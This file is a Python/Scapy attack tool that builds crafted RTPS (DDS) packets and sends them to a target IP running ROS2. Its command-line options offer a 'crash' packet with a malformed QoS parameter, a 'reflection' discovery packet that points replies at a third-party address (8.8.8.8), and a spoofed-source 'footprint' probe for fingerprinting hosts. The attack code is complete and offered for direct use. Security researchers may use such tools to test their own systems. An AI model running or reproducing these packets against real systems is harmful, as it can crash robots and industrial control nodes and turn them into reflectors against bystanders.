#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.inet import UDP, IP
from wasabi import color
import re

load_contrib('rtps')

bind_layers(UDP, IP)
conf.verb = 0

crash_dport=7410
dport = 7400
footprint_sport=6666
sport=17900

def get_crasher(dest):
    crasher = (
        IP(
            version=4,
            ihl=5,
            tos=0,
            len=82,
            flags=2,
            frag=0,
            ttl=64,
            proto=17,
            dst=dest,
        )
        / UDP(sport=sport, dport=crash_dport, len=62)
        / RTPS(
            protocolVersion=ProtocolVersionPacket(major=2, minor=4),
            vendorId=VendorIdPacket(vendor_id=RawVal(b"\x01\x03")),
            guidPrefix=GUIDPrefixPacket(
                hostId=16974402, appId=2886795266, instanceId=1172693757
            ),
            magic=b"RTPS",
        )
        / RTPSMessage(
            submessages=[
                RTPSSubMessage_DATA(
                    submessageId=21,
                    submessageFlags=5,
                    octetsToNextHeader=0,
                    extraFlags=0,
                    octetsToInlineQoS=16,
                    readerEntityIdKey=0,
                    readerEntityIdKind=0,
                    writerEntityIdKey=256,
                    writerEntityIdKind=194,
                    writerSeqNumHi=0,
                    writerSeqNumLow=2,
                    data=DataPacket(
                        encapsulationKind=3,
                        encapsulationOptions=0,
                        parameterList=ParameterListPacket(
                            parameterValues=[
                                PID_BUILTIN_ENDPOINT_QOS(
                                    parameterId=119,
                                    parameterLength=0,
                                    parameterData=b"\x00\x00\x00\x00",
                                ),
                                PID_PAD(parameterId=b"\x00\x00"),
                            ]
                        ),
                    ),
                )
            ]
        )
    )
    return crasher

def get_reflection(dest):
    reflection = (
        IP(
            version=4,
            ihl=5,
            tos=0,
            len=288,
            id=41057,
            flags=2,
            frag=0,
            dst=dest,
        )
        / UDP(sport=45892, dport=dport, len=268)
        / RTPS(
            protocolVersion=ProtocolVersionPacket(major=2, minor=4),
            vendorId=VendorIdPacket(vendor_id=RawVal(b"\x01\x03")),
            guidPrefix=GUIDPrefixPacket(
                hostId=16974402, appId=2886795267, instanceId=10045242
            ),
            magic=b"RTPS",
        )
        / RTPSMessage(
            submessages=[
                RTPSSubMessage_DATA(
                    submessageId=21,
                    submessageFlags=5,
                    octetsToNextHeader=0,
                    extraFlags=0,
                    octetsToInlineQoS=16,
                    readerEntityIdKey=0,
                    readerEntityIdKind=0,
                    writerEntityIdKey=256,
                    writerEntityIdKind=194,
                    writerSeqNumHi=0,
                    writerSeqNumLow=1,
                    data=DataPacket(
                        encapsulationKind=3,
                        encapsulationOptions=0,
                        parameterList=ParameterListPacket(
                            parameterValues=[
                                PID_BUILTIN_ENDPOINT_QOS(
                                    parameterId=119,
                                    parameterLength=4,
                                    parameterData=b"\x00\x00\x00\x00",
                                ),
                                PID_DOMAIN_ID(
                                    parameterId=15,
                                    parameterLength=4,
                                    parameterData=b"*\x00\x00\x00",
                                ),
                                PID_PROTOCOL_VERSION(
                                    parameterId=21,
                                    parameterLength=4,
                                    protocolVersion=ProtocolVersionPacket(major=2, minor=4),
                                    padding=b"\x00\x00",
                                ),
                                PID_PARTICIPANT_GUID(
                                    parameterId=80,
                                    parameterLength=16,
                                    guid=b"\x01\x03\x02B\xac\x11\x00\x03\x00\x99G:\x00\x00\x01\xc1",
                                ),
                                PID_VENDOR_ID(
                                    parameterId=22,
                                    parameterLength=4,
                                    vendorId=VendorIdPacket(vendor_id=RawVal(b"\x01\x03")),
                                    padding=b"\x00\x00",
                                ),
                                PID_PARTICIPANT_BUILTIN_ENDPOINTS(
                                    parameterId=68,
                                    parameterLength=4,
                                    parameterData=b"?\xfc\x00\x00",
                                ),
                                PID_BUILTIN_ENDPOINT_SET(
                                    parameterId=88,
                                    parameterLength=4,
                                    parameterData=b"?\xfc\x00\x00",
                                ),
                                PID_METATRAFFIC_UNICAST_LOCATOR(
                                    parameterId=50,
                                    parameterLength=24,
                                    locator=LocatorPacket(
                                        locatorKind=16777216, port=47324, address="8.8.8.8"
                                    ),
                                ),
                                PID_METATRAFFIC_MULTICAST_LOCATOR(
                                    parameterId=51,
                                    parameterLength=24,
                                    locator=LocatorPacket(
                                        locatorKind=16777216,
                                        port=17902,
                                        address="239.255.0.1",
                                    ),
                                ),
                                PID_DEFAULT_UNICAST_LOCATOR(
                                    parameterId=49,
                                    parameterLength=24,
                                    locator=LocatorPacket(
                                        locatorKind=16777216,
                                        port=12345,
                                        address="127.0.0.1",
                                    ),
                                ),
                                PID_DEFAULT_MULTICAST_LOCATOR(
                                    parameterId=72,
                                    parameterLength=24,
                                    locator=LocatorPacket(
                                        locatorKind=16777216,
                                        port=12345,
                                        address="127.0.0.1",
                                    ),
                                ),
                                PID_PARTICIPANT_MANUAL_LIVELINESS_COUNT(
                                    parameterId=52,
                                    parameterLength=4,
                                    parameterData=b"\x00\x00\x00\x00",
                                ),
                                PID_UNKNOWN(
                                    parameterId=45061,
                                    parameterLength=4,
                                    parameterData=b"\x03\x00\x00\x00",
                                ),
                                PID_PARTICIPANT_LEASE_DURATION(
                                    parameterId=2,
                                    parameterLength=8,
                                    parameterData=b",\x01\x00\x00\x00\x00\x00\x00",
                                ),
                            ],
                            sentinel=PID_SENTINEL(parameterId=1, parameterLength=0),
                        ),
                    ),
                )
            ]
        )
    )
    return reflection

def get_footprint(source, dest):
    footprint = (
        IP(
            version=4,
            ihl=5,
            tos=0,
            id=61436,
            flags=0,
            frag=0,
            proto=17,
            src=source,
            dst=dest,
        )
        / UDP(sport=sport, dport=dport)
        / RTPS(
            protocolVersion=ProtocolVersionPacket(major=2, minor=1),
            vendorId=VendorIdPacket(vendor_id=RawVal(b"\x01\x10")),
            guidPrefix=GUIDPrefixPacket(
                hostId=17849486, appId=752113735, instanceId=4200214739
            ),
            magic=b"RTPS",
        )
        / RTPSMessage(
            submessages=[
                RTPSSubMessage_INFO_TS(
                    submessageId=9,
                    submessageFlags=1,
                    octetsToNextHeader=8,
                    ts_seconds=1635160430,
                    ts_fraction=3848061961,
                ),
                RTPSSubMessage_DATA(
                    submessageId=21,
                    submessageFlags=5,
                    octetsToNextHeader=248,
                    extraFlags=0,
                    octetsToInlineQoS=16,
                    readerEntityIdKey=0,
                    readerEntityIdKind=0,
                    writerEntityIdKey=256,
                    writerEntityIdKind=194,
                    writerSeqNumHi=0,
                    writerSeqNumLow=1,
                    data=DataPacket(
                        encapsulationKind=3,
                        encapsulationOptions=0,
                        parameterList=ParameterListPacket(
                            parameterValues=[
                                PID_USER_DATA(
                                    parameterId=44,
                                    parameterLength=28,
                                    parameterData=b"\x17\x00\x00\x00DDSPerf:0:58:test.local\x00",
                                ),
                                PID_PROTOCOL_VERSION(
                                    parameterId=21,
                                    parameterLength=4,
                                    protocolVersion=ProtocolVersionPacket(major=2, minor=1),
                                    padding=b"\x00\x00",
                                ),
                                PID_VENDOR_ID(
                                    parameterId=22,
                                    parameterLength=4,
                                    vendorId=VendorIdPacket(vendor_id=RawVal(b"\x01\x10")),
                                    padding=b"\x00\x00",
                                ),
                                PID_PARTICIPANT_LEASE_DURATION(
                                    parameterId=2,
                                    parameterLength=8,
                                    parameterData=b"\x00\x00\x00\x008\x89A\x00",
                                ),
                                PID_PARTICIPANT_GUID(
                                    parameterId=80,
                                    parameterLength=16,
                                    guid=b"\x01\x10\\\x8e,\xd4XG\xfaZ0\xd3\x00\x00\x01\xc1",
                                ),
                                PID_BUILTIN_ENDPOINT_SET(
                                    parameterId=88,
                                    parameterLength=4,
                                    parameterData=b"\x00\x00\x00\x00",
                                ),
                                PID_DOMAIN_ID(
                                    parameterId=15,
                                    parameterLength=4,
                                    parameterData=b"\x00\x00\x00\x00",
                                ),
                                PID_DEFAULT_UNICAST_LOCATOR(
                                    parameterId=49,
                                    parameterLength=24,
                                    locator=LocatorPacket(
                                        locatorKind=16777216,
                                        port=sport,
                                        address=source,
                                    ),
                                ),
                                PID_METATRAFFIC_UNICAST_LOCATOR(
                                    parameterId=50,
                                    parameterLength=24,
                                    locator=LocatorPacket(
                                        locatorKind=16777216,
                                        port=sport,
                                        address=source,
                                    ),
                                ),
                                PID_UNKNOWN(
                                    parameterId=32775,
                                    parameterLength=56,
                                    parameterData=b"\x00\x00\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1d\x00\x00\x00test.local/0.9.0/Linux/Linux\x00\x00\x00\x00",
                                ),
                                PID_UNKNOWN(
                                    parameterId=32793,
                                    parameterLength=4,
                                    parameterData=b"\x00\x80\x06\x00",
                                ),
                            ],
                            sentinel=PID_SENTINEL(parameterId=1, parameterLength=0),
                        ),
                    ),
                ),
            ]
        )
    )
    return footprint

def validate_ip(text: str):
    if not re.match('(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\\.)'
                    '{3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])',
                    text):
        raise ValueError('it''s not a valid IP address')
    else:
        return text

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="Launches attacks on ROS2. "
                                     "May need root privileges to run")


    parser.add_argument(dest='attacks', metavar='attacks', 
                        choices={'footprint','reflection','crash'}, nargs='+',
                        help="the kind of attacks to launch "
                        "(footprint, crash, reflection)", action='append')
    parser.add_argument('-t', '--target', metavar='address', type=validate_ip,
                        help='the IP address of the target of the attacks',
                        required=True)
    parser.add_argument('-c','--count', metavar='number', type=int, required=False,
                        help='the number of launches for each attack')
    parser.add_argument('-s','--source',metavar='address',required=False,
                        type=validate_ip,
                        help='the IP address to be used as the source address of '
                        'sent packets')

    args = parser.parse_args()

    #if not os.geteuid()==0:
     #   sys.exit('this script must be run as root!')

    dst=args.target

    if 'footprint' in args.attacks[0] and args.source is None:
        parser.error('when attack "footprint" is requested, you must also specify '
                     'the source IP address by the -s/--source parameter') 

    src=args.source

    def exec_footprint():
        ans = sr1(get_footprint(src, dst), retry=0, timeout=10)
        if ans:
            if (ICMP in ans) and (ans[ICMP].code == 3):
                print(color("Destination unreacheable", fg=16, bg="yellow"))
            elif ICMP in ans:
                print(color("ICMP code: " + str(ans[ICMP].code), fg=16, bg="yellow"))
            elif RTPS in ans:
                print(color(ans.summary(), fg=16, bg="green"))
                # ans.show()
        else:
            print(color("No response received.", fg=16, bg="red"))
        
    def exec_crash():
        send(get_crasher(dst))

    def exec_reflection():
        send(get_reflection(dst))


    atks = args.attacks[0]
    execs=[]

    if 'footprint' in atks:
        execs.append(exec_footprint)
    if 'crash' in atks:
        execs.append(exec_crash)
    if 'reflection' in atks:
        execs.append(exec_reflection)

    try:
        for i in range(args.count):
            for fun in execs:
                fun()
    except PermissionError:
        print(color('unable to perform attacks operation due to lack of permissions!', fg='red'), file=sys.stderr)
        print('This script needs permission to bind to network interfaces to capture packets and to bind to reserved ports.')
        print('One way to achieve this is by running it as root (with sudo).')
